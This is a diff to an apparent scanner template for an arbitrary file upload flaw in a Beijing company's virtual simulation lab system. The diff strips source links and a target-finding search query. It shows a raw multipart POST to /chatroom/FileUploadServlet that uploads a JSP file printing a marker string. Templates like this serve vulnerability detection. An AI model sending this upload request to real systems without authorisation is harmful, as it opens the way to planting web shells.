@@ -3,12 +3,8 @@ info:
   name: 北京润尼尔科技股份有限公司虚拟仿真实验室系统FileUploadServlet 任意文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kvgnmhym8l0ngeee'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: kvgnmhym8l0ngeee
-    fofa: body="/images/rdm.ico"
 http:
 - raw:
   - 'POST /chatroom/FileUploadServlet HTTP/1.1
@@ -32,16 +28,10 @@ http:
     Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGIc4ig8R
 
 
-
-
-
-
     ------WebKitFormBoundaryGIc4ig8R
 
 
     Content-Disposition: form-data; name="aaa"; filename="dudesite.jsp"
-
-
 
 
     <% out.println("435352Els1K9wZvOlSsdsdmrg"); %>
